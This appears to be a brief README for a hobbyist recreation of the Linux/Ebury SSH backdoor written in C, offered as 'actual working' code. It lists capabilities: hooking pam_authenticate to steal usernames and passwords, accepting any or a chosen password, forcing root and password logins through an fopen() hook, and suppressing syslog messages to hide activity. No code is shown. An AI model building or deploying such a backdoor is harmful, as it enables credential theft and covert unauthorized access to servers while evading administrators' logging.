I decided to put actual working C behind Linux/Ebury that's hopefully readable.

	bad.c contains the constructor (init())


###Working:
	no use of offsets :^) -- all modular

	basic detection if loaded in sshd

	steal username and password from pam_authenticate
		allow any password - or choose which password to allow

	always allow PermitRootLogin and PasswordAuthenticate using an fopen() hook
		simple enough to add more hooks to config options

	basic syslog() and pam_syslog() hooking 
		just decide what to base message hiding on


